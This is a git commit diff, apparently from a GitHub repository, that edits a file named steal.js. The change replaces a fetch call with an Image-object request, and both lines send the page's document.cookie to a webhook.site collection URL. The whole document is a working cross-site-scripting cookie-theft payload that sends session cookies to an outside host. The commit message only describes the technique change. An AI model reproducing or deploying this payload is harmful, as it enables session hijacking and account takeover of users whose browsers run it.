8e61120eb9fbe7c904ecfdaa5dde5acda207ff0f
Syed Zaeem Shakir <138659995+zaeem-shakir@users.noreply.github.com>
2026-04-28 00:36:30 +1000

    Change cookie fetching method to use Image object

--- steal.js
+++ steal.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/75717ab0-68d8-4f0e-b257-e3336295351a?c=' + document.cookie)
+new Image().src = "https://webhook.site/75717ab0-68d8-4f0e-b257-e3336295351a?c=" + encodeURIComponent(document.cookie);
